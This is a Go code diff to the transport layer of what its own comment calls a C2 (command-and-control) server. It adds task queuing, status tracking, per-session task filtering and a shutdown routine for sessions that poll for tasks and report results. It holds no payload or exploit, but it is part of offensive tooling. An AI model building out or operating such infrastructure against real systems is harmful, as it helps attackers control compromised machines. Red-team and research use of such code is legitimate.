@@ -1,6 +1,7 @@
 package transport
 
 import (
+	"context"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
@@ -152,6 +153,22 @@ func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
 	
 	tasks := s.getPendingTasks(sessionID)
 	
+	// Mark tasks as in-progress and schedule removal
+	for _, taskMap := range tasks {
+		if taskID, ok := taskMap["id"].(string); ok {
+			if s.taskQueue != nil {
+				s.taskQueue.UpdateStatus(taskID, "in_progress")
+				// Remove task after completion timeout (30 seconds)
+				go func(id string) {
+					time.Sleep(30 * time.Second)
+					if task := s.taskQueue.Get(id); task != nil && task.Status == "in_progress" {
+						s.taskQueue.Remove(id)
+					}
+				}(taskID)
+			}
+		}
+	}
+	
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]interface{}{
 		"tasks": tasks,
@@ -171,9 +188,22 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	
+	// Update task status and remove after completion
+	if taskID, ok := result["task_id"].(string); ok {
+		if s.taskQueue != nil {
+			s.taskQueue.SetResult(taskID, result)
+			// Remove task after a short delay to allow result processing
+			go func() {
+				time.Sleep(5 * time.Second)
+				s.taskQueue.Remove(taskID)
+			}()
+		}
+	}
+	
 	s.logger.Info("Task result from session %s: %v", sessionID, result)
 	
 	w.WriteHeader(http.StatusOK)
+	w.Write([]byte("OK"))
 }
 
 func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
@@ -186,6 +216,15 @@ func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
 	tasks := make([]map[string]interface{}, 0, len(pending))
 	
 	for _, task := range pending {
+		// Filter tasks by session if specified in parameters
+		if task.Parameters != nil {
+			if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
+				if taskSessionID != sessionID {
+					continue
+				}
+			}
+		}
+		
 		tasks = append(tasks, map[string]interface{}{
 			"id":         task.ID,
 			"type":       task.Type,
@@ -201,15 +240,31 @@ func generateSessionID() string {
 	return fmt.Sprintf("sess-%d", time.Now().UnixNano())
 }
 
+// EnqueueTask adds a task to the queue for a specific session
+func (s *Server) EnqueueTask(task *tasks.Task) error {
+	return s.taskQueue.Add(task)
+}
+
 // GetSessions returns all active sessions
 func (s *Server) GetSessions() map[string]*Session {
 	s.sessionsMu.RLock()
 	defer s.sessionsMu.RUnlock()
 	
-	sessions := make(map[string]*Session)
+	// Create a copy to avoid race conditions
+	sessions := make(map[string]*Session, len(s.sessions))
 	for id, session := range s.sessions {
 		sessions[id] = session
 	}
 	return sessions
+}
+
+// Stop stops the C2 server
+func (s *Server) Stop() error {
+	if s.server != nil {
+		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancel()
+		return s.server.Shutdown(ctx)
+	}
+	return nil
 }
 
